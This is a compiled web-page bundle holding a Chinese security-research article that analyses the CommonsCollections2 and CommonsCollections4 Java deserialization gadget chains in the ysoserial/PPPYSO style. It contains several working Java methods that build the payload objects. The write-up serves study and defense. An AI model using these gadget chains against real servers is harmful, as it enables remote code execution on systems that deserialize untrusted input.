"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[2972],{18802:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>t,default:()=>d,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var o=r(85893),s=r(11151);const a={sidebar_position:1,tags:["ysoserial","PPPYSO"]},t="CommonsCollections2\u30014",i={id:"PPPYSO/gadgets/CommonsCollections/CommonsCollections2 4/CommonsCollections2 4",title:"CommonsCollections2\u30014",description:"0x01 TransformingComparator",source:"@site/docs/01-PPPYSO/01-gadgets/01-CommonsCollections/06-CommonsCollections2 4/06-CommonsCollections2 4.md",sourceDirName:"01-PPPYSO/01-gadgets/01-CommonsCollections/06-CommonsCollections2 4",slug:"/PPPYSO/gadgets/CommonsCollections/CommonsCollections2 4/",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections2 4/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/01-PPPYSO/01-gadgets/01-CommonsCollections/06-CommonsCollections2 4/06-CommonsCollections2 4.md",tags:[{label:"ysoserial",permalink:"/docs/tags/ysoserial"},{label:"PPPYSO",permalink:"/docs/tags/pppyso"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["ysoserial","PPPYSO"]},sidebar:"tutorialSidebar",previous:{title:"CommonsCollections3",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections3/"},next:{title:"CommonsCollections8",permalink:"/docs/PPPYSO/gadgets/CommonsCollections/CommonsCollections8/"}},c={},l=[{value:"0x01 TransformingComparator",id:"0x01-transformingcomparator",level:2},{value:"0x02 PriorityQueue",id:"0x02-priorityqueue",level:2},{value:"0x03 \u53bb\u9664Transformer[]",id:"0x03-\u53bb\u9664transformer",level:2},{value:"0x04 \u4e3a\u4ec0\u4e48 TransformingComparator \u9700\u8981\u5b9e\u73b0 Serializable\uff1f",id:"0x04-\u4e3a\u4ec0\u4e48-transformingcomparator-\u9700\u8981\u5b9e\u73b0-serializable",level:2},{value:"0x05 CommonsCollections4",id:"0x05-commonscollections4",level:2}];function m(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,s.a)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h1,{id:"commonscollections24",children:"CommonsCollections2\u30014"}),"\n",(0,o.jsx)(n.h2,{id:"0x01-transformingcomparator",children:"0x01 TransformingComparator"}),"\n",(0,o.jsxs)(n.p,{children:["\u524d\u9762\u5206\u6790\u7684\u51e0\u6761 CC \u94fe\u90fd\u662f commons-collections < 3.x \u7248\u672c\u7684\u5229\u7528\uff0c\u4e4b\u540e Apache \u5f00\u53d1\u4e0d\u518d\u5ef6\u7eed\u8fd9\u4e2a\u7248\u672c\uff0c\u800c\u662f\u63a8\u51fa\u4e86\u65b0\u7684 4.x \u7248\u672c\u3002\u8fd8\u662f\u548c\u5206\u6790 3.x \u4e00\u6837\u627e\u8c03\u7528\u4e86 ",(0,o.jsx)(n.code,{children:"transform()"})," \u7684\u65b9\u6cd5\uff0c\u5b9a\u4f4d\u5230 ",(0,o.jsx)(n.code,{children:"org.apache.commons.collections4.comparators.TransformingComparator#compare()"}),"\u3002"]}),"\n",(0,o.jsxs)(n.p,{children:["\u8fd9\u4e2a\u7c7b\u4e0d\u5b58\u5728\u5bf9 ",(0,o.jsx)(n.code,{children:"readobject()"})," \u548c ",(0,o.jsx)(n.code,{children:"compare()"})," \u7684\u8c03\u7528\uff0c\u4e0d\u80fd\u4f5c\u4e3a kick-off \uff0c\u4f46\u5b9e\u73b0\u4e86 ",(0,o.jsx)(n.code,{children:"Serializable"})," \u63a5\u53e3\uff0c\u8fd9\u662f gadget \u5f62\u6210\u7684\u5fc5\u8981\u6761\u4ef6\uff0c\u6807\u8bb0\u4e00\u4e0b\uff0c\u7ee7\u7eed\u770b\u522b\u7684\u7c7b\u3002"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20230809102252027",src:r(39926).Z+"",width:"1774",height:"266"})}),"\n",(0,o.jsx)(n.h2,{id:"0x02-priorityqueue",children:"0x02 PriorityQueue"}),"\n",(0,o.jsxs)(n.p,{children:["CC2 \u4e2d\u4f7f\u7528\u7684 kick-off \u662f ",(0,o.jsx)(n.code,{children:"PriorityQueue"})," \u3002\u8fd9\u662f\u4e00\u4e2a jdk \u7684\u539f\u751f\u96c6\u5408\uff0c\u662f\u57fa\u4e8e\u4f18\u5148\u7ea7\u5806\u7684\u65e0\u9650\u5236\u4f18\u5148\u7ea7\u961f\u5217\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5143\u7d20\u6839\u636e\u81ea\u7136\u987a\u5e8f\u8fdb\u884c\u6392\u5e8f\uff0c\u4e5f\u53ef\u4ee5\u5728\u6784\u5efa\u65f6\u6307\u5b9a\u6bd4\u8f83\u5668 ",(0,o.jsx)(n.code,{children:"Comparator"})," \u8fdb\u884c\u6392\u5e8f\u3002"]}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"PriorityQueue#readObject()"})," \u4e2d\uff0c\u5148\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\u8fd8\u539f\u4e3a queue\uff0c\u518d\u8c03\u7528 ",(0,o.jsx)(n.code,{children:"heapify()"})," \u8fdb\u884c\u6392\u5e8f\uff0c",(0,o.jsx)(n.code,{children:"heapify()"})," \u4e2d\u5bf9 size \u8fdb\u884c\u79fb\u4f4d\uff0csize \u503c\u53ef\u4ee5\u901a\u8fc7\u53cd\u5c04\u4fee\u6539\u6216\u76f4\u63a5 add \u4fe9\u5143\u7d20\u589e\u52a0\u6570\u7ec4\u957f\u5ea6"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20230809103214438",src:r(56598).Z+"",width:"1848",height:"852"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20230809103252608",src:r(60288).Z+"",width:"1494",height:"166"})}),"\n",(0,o.jsxs)(n.p,{children:["\u7136\u540e\u901a\u8fc7 ",(0,o.jsx)(n.code,{children:"heapify()"})," \u8c03\u7528 ",(0,o.jsx)(n.code,{children:"siftDown()"}),"\uff0c\u6ee1\u8db3 ",(0,o.jsx)(n.code,{children:"comparator"})," \u975e\u7a7a\u7684\u6761\u4ef6\u8fdb\u5165 ",(0,o.jsx)(n.code,{children:"siftDownUsingComparator()"})]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20230809103313136",src:r(29762).Z+"",width:"1544",height:"258"})}),"\n",(0,o.jsxs)(n.p,{children:["\u5728  ",(0,o.jsx)(n.code,{children:"siftDownUsingComparator()"})," \u627e\u5230\u8c03\u7528 ",(0,o.jsx)(n.code,{children:"comparator.compare()"})," \u7684\u4ee3\u7801\u53ef\u4ee5\u4e0e\u5148\u524d\u6784\u9020\u7684 Chain \u62fc\u63a5"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{alt:"image-20230809103502450",src:r(81295).Z+"",width:"1774",height:"668"})}),"\n",(0,o.jsx)(n.h2,{id:"0x03-\u53bb\u9664transformer",children:"0x03 \u53bb\u9664Transformer[]"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-java",children:'    public Queue<Object> getObject(final String command) throws Exception {\n        Object templatesImpl = Gadgets.createTemplatesImpl(command);\n\n        // inert chain for setup\n        final Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{new ConstantTransformer(1)});\n        // real chain for after setup\n//        final Transformer[] transformers = new Transformer[]{\n//                new ConstantTransformer(TrAXFilter.class),\n//                new InstantiateTransformer(\n//                        new Class[]{Templates.class},\n//                        new Object[]{templatesImpl})};\n        final Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(templatesImpl),\n                new InvokerTransformer("newTransformer", new Class[0], new Object[0]),\n                new ConstantTransformer(1),\n        };\n        PriorityQueue<Object> queue = new PriorityQueue<>(2);\n        queue.add("1");\n        queue.add("2");\n        // Reflections.setFieldValue(queue, "size", 2);\n        TransformingComparator transformingComparator = new TransformingComparator(transformerChain);\n        Reflections.setFieldValue(queue, "comparator", transformingComparator);\n        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);\n\n        return queue;\n    }\n'})}),"\n",(0,o.jsxs)(n.p,{children:["\u5148\u6309\u6211\u4eec\u7684\u65b9\u5f0f\u901a\u8fc7 ",(0,o.jsx)(n.code,{children:"TemplatesImpl"})," \u5b9e\u73b0\uff0c\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u8fd8\u662f\u4f7f\u7528\u4e86 Transformer[] \u4e0e ysoserial \u7684\u4e0d\u540c\uff0c\u5728 ",(0,o.jsx)(n.a,{href:"https://www.anquanke.com/post/id/192619",children:"wh1t3p1g"})," \u7684\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u4e86\u600e\u4e48\u5728 3.2.1 \u73af\u5883\u4e0b\u7684\u65e0\u6570\u7ec4\u6539\u9020\uff0c\u8fd9\u7bc7\u6587\u7ae0\u7d27\u6263 shiro \u6765\u5206\u6790\u4e3a\u4ec0\u4e48\u9700\u8981\u6539\u9020\u4ee5\u53ca\u600e\u4e48\u6539\u9020\u3002\u73b0\u5728\u7684\u8bdd\u8fd8\u662f\u57fa\u4e8e 4.0 \u94fa\u5f00\uff0c \u5148\u770b\u770b\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\uff0c ",(0,o.jsx)(n.code,{children:"InvokerTransformer"})," \u7684\u76ee\u7684\u662f\u8c03\u7528 ",(0,o.jsx)(n.code,{children:"newTransformer"})," \u65b9\u6cd5\uff0c\u800c ",(0,o.jsx)(n.code,{children:"ConstantTransformer"})," \u7684\u4f5c\u7528\u662f\u521d\u59cb\u5316\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61\uff0c\u5728 CC1 \u7684\u5206\u6790\u4e2d\u63d0\u5230\u8fd9\u662f\u4e3a\u4e86\u89e3\u51b3 ",(0,o.jsx)(n.code,{children:"AnnotationInvocationHandler.readobject()"})," \u4e2d value \u88ab ",(0,o.jsx)(n.code,{children:"AnnotationTypeMismatchExceptionProxy"})," \u5c01\u88c5\u4e00\u5c42\u7684\u95ee\u9898\u3002CC2 \u4e2d\u5e76\u6ca1\u6709\u4f7f\u7528\u8fd9\u4e2a kick-off\uff0c\u6240\u4ee5\u53ef\u4ee5\u53bb\u9664 ",(0,o.jsx)(n.code,{children:"ConstantTransformer"}),"\uff0c\u90a3\u4e48\u6570\u7ec4\u957f\u5ea6\u4e3a1\uff0c\u5c31\u81ea\u7136\u53ef\u4ee5\u514d\u53bb\u6570\u7ec4\u4e86\u3002"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-java",children:'final Transformer[] transformers = new Transformer[]{\n        new ConstantTransformer(templatesImpl),\n        new InvokerTransformer("newTransformer", new Class[0], new Object[0]),\n        new ConstantTransformer(1),\n};\n'})}),"\n",(0,o.jsxs)(n.p,{children:["\u6574\u4f53\u7684\u601d\u8def\u662f ",(0,o.jsx)(n.code,{children:"InvokerTransformer"})," \u5148\u8c03\u7528\u4e86\u4e00\u4e2a\u65e0\u5173\u65b9\u6cd5\uff0c\u518d\u53cd\u5c04\u5c06\u6784\u9020\u597d\u7684 transformer \u653e\u5230\u6570\u7ec4\u7b2c\u4e00\u4f4d\u3002\u8fd9\u91cc\u4f7f\u7528\u4e86\u4e0e ysoserial ",(0,o.jsx)(n.code,{children:"toString()"})," \u4e0d\u540c\u7684\u65b9\u6cd5",(0,o.jsx)(n.code,{children:"hashCode()"})," \uff0c\u5373\u6211\u4eec\u8fd9\u91cc\u8c03\u7528 ",(0,o.jsx)(n.code,{children:"queue.add(1)"})," \u6dfb\u52a0 ",(0,o.jsx)(n.code,{children:"Integer"})," \u5bf9\u8c61\u3002\u4f7f\u7528 ",(0,o.jsx)(n.code,{children:"hashCode()"})," \u6765\u8fdb\u884c\u4e3e\u4f8b\u7684\u539f\u56e0\u662f ",(0,o.jsx)(n.code,{children:"toString()"})," \u548c ",(0,o.jsx)(n.code,{children:"hashCode()"})," \u4e00\u6837\u90fd\u5728 ",(0,o.jsx)(n.code,{children:"Object"})," \u5bf9\u8c61\u4e2d\u5b58\u5728\u3002"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-java",children:'public Queue<Object> getObject(final String command) throws Exception {\n    final Object templates = Gadgets.createTemplatesImpl(command);\n    // mock method name until armed\n    final InvokerTransformer transformer = new InvokerTransformer("hashCode", null, null);\n\n    // create queue with numbers and basic comparator\n    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));\n    // stub data for replacement later\n    queue.add(1);\n    queue.add(1);\n\n    // switch method called by comparator\n    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");\n\n    // switch contents of queue\n    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");\n    queueArray[0] = templates;\n    queueArray[1] = 1;\n\n    return queue;\n}\n'})}),"\n",(0,o.jsx)(n.h2,{id:"0x04-\u4e3a\u4ec0\u4e48-transformingcomparator-\u9700\u8981\u5b9e\u73b0-serializable",children:"0x04 \u4e3a\u4ec0\u4e48 TransformingComparator \u9700\u8981\u5b9e\u73b0 Serializable\uff1f"}),"\n",(0,o.jsxs)(n.p,{children:["\u8fd9\u4e2a\u95ee\u9898\u5176\u5b9e\u5c31\u662f\u5bf9 Java \u5e8f\u5217\u5316\u673a\u5236\u7684\u7406\u89e3\u7a0b\u5ea6\uff0c\u5728\u5206\u6790\u8c03\u7528\u94fe\u65f6\uff0c\u5f88\u591a\u4eba\u7684\u5173\u6ce8\u70b9\u901a\u5e38\u90fd\u5728 readObject() \u4e0a\uff0c\u5ffd\u7565\u4e86\u53e6\u4e00\u4e2a\u540c\u6837\u91cd\u8981\u7684\u65b9\u6cd5\uff0cwriteObject() \uff0c\u5c06 CC2 \u7684\u5305\u6362\u6210 3 \u7248\u672c\uff0c\u5c31\u4f1a\u53d1\u73b0\u5728\u8fdb\u5165 ",(0,o.jsx)(n.code,{children:"java.io.ObjectOutputStream#defaultWriteFields()"}),"  \u8fd9\u4e2a\u65b9\u6cd5\u540e\u5c31\u4f1a\u62a5\u9519\u3002"]}),"\n",(0,o.jsx)(n.p,{children:"Java \u7c7b\u5b9e\u4f8b\u5e8f\u5217\u5316\u65f6\u8be5\u7c7b\u7684\u5b57\u6bb5\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u4e4b\u4e00\uff1a"}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.strong,{children:"\u5b57\u6bb5\u672c\u8eab\u662f\u57fa\u672c\u7c7b\u578b\u6216\u5305\u88c5\u7c7b\u578b\uff1a"})," \u57fa\u672c\u7c7b\u578b\uff08\u5982 ",(0,o.jsx)(n.code,{children:"int"}),"\u3001",(0,o.jsx)(n.code,{children:"double"})," \u7b49\uff09\u4ee5\u53ca\u5176\u5bf9\u5e94\u7684\u5305\u88c5\u7c7b\u578b\uff08\u5982 ",(0,o.jsx)(n.code,{children:"Integer"}),"\u3001",(0,o.jsx)(n.code,{children:"Double"})," \u7b49\uff09\u90fd\u662f\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316\u7684\u3002"]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsxs)(n.strong,{children:["\u5b57\u6bb5\u5b9e\u73b0\u4e86 ",(0,o.jsx)(n.code,{children:"Serializable"})," \u63a5\u53e3\uff1a"]})," \u5982\u679c\u4e00\u4e2a\u7c7b\u7684\u5b57\u6bb5\u662f\u81ea\u5b9a\u4e49\u7c7b\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u8be5\u81ea\u5b9a\u4e49\u7c7b\u9700\u8981\u5b9e\u73b0 ",(0,o.jsx)(n.code,{children:"Serializable"})," \u63a5\u53e3\uff0c\u4ee5\u8868\u660e\u5b83\u7684\u5b9e\u4f8b\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316\u3002"]}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsxs)(n.strong,{children:["\u5b57\u6bb5\u88ab\u6807\u8bb0\u4e3a ",(0,o.jsx)(n.code,{children:"transient"}),"\uff1a"]})," \u5982\u679c\u4e00\u4e2a\u5b57\u6bb5\u88ab\u6807\u8bb0\u4e3a ",(0,o.jsx)(n.code,{children:"transient"}),"\uff0c\u90a3\u4e48\u5b83\u5c06\u4e0d\u4f1a\u88ab\u5e8f\u5217\u5316\u3002\u8fd9\u53ef\u4ee5\u7528\u4e8e\u6392\u9664\u67d0\u4e9b\u654f\u611f\u4fe1\u606f\u6216\u4e0d\u9700\u8981\u5e8f\u5217\u5316\u7684\u5b57\u6bb5\u3002"]}),"\n"]}),"\n",(0,o.jsxs)(n.p,{children:["\u6240\u4ee5 PriorityQueue \u7684 comparator \u5b57\u6bb5\u4e5f\u9700\u8981\u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\u4e4b\u4e00\uff0c\u4ee5\u4fbf\u8be5\u5bf9\u8c61\u53ef\u4ee5\u88ab\u6b63\u786e\u5e8f\u5217\u5316\uff0c",(0,o.jsx)(n.code,{children:"org.apache.commons.collections.comparators.TransformingComparator"})," \u6ca1\u6709\u5b9e\u73b0 ",(0,o.jsx)(n.code,{children:"Serializable"})," \u81ea\u7136\u4e0d\u80fd\u5229\u7528\u4e86\u3002"]}),"\n",(0,o.jsx)(n.h2,{id:"0x05-commonscollections4",children:"0x05 CommonsCollections4"}),"\n",(0,o.jsxs)(n.p,{children:["\u8fd9\u6761\u94fe\u53ef\u4ee5\u770b\u6210CC2 \u548c CC3 \u7684\u7ed3\u5408 Gadget \u5982\u4e0b ",(0,o.jsx)(n.code,{children:"PriorityQueue+ TransformingComparator + Transformer + TrAXFilter + TemplatesImpl"})," \uff0c\u987a\u7740\u4e4b\u524d\u7684\u5f62\u5f0f\u5199\u6cd5\u5982\u4e0b\u3002ysoserial \u7684\u5199\u6cd5\u5c31\u662f\u7528\u7684\u53cd\u5c04\u53bb\u6328\u4e2a\u6784\u9020 Transformer[] \u4e2d\u7684 ",(0,o.jsx)(n.code,{children:"ConstantTransformer"})," \u548c ",(0,o.jsx)(n.code,{children:"InstantiateTransformer"}),"\u3002"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-java",children:'public Queue<Object> getObject(final String command) throws Exception {\n    Object templates = Gadgets.createTemplatesImpl(command);\n\n    // inert chain for setup\n    final Transformer transformerChain = new ChainedTransformer(\n            new Transformer[]{new ConstantTransformer(1)});\n    // real chain for after setup\n    final Transformer[] transformers = new Transformer[]{\n            new ConstantTransformer(TrAXFilter.class),\n            new InstantiateTransformer(\n                    new Class[]{Templates.class},\n                    new Object[]{templates})};\n\n    // create queue with numbers\n    PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformerChain));\n    queue.add(1);\n    queue.add(1);\n    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);\n    return queue;\n}\n'})})]})}function d(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(m,{...e})}):m(e)}},39926:(e,n,r)=>{r.d(n,{Z:()=>o});const o=r.p+"assets/images/image-20230809102252027-157c7c2fcc47482272e371ea2de0c57e.png"},56598:(e,n,r)=>{r.d(n,{Z:()=>o});const o=r.p+"assets/images/image-20230809103214438-4f533bf5e62e94c00eae4fc0c9f0703a.png"},60288:(e,n,r)=>{r.d(n,{Z:()=>o});const o=r.p+"assets/images/image-20230809103252608-d5e4afa329ff8e0c8403106bc88e7b75.png"},29762:(e,n,r)=>{r.d(n,{Z:()=>o});const o=r.p+"assets/images/image-20230809103313136-e5d5a0021b5a316fbabe23368b12cb42.png"},81295:(e,n,r)=>{r.d(n,{Z:()=>o});const o=r.p+"assets/images/image-20230809103502450-7056ecab23caaabdff0c43daec411a94.png"},11151:(e,n,r)=>{r.d(n,{Z:()=>i,a:()=>t});var o=r(67294);const s={},a=o.createContext(s);function t(e){const n=o.useContext(a);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:t(e.components),o.createElement(a.Provider,{value:n},e.children)}}}]);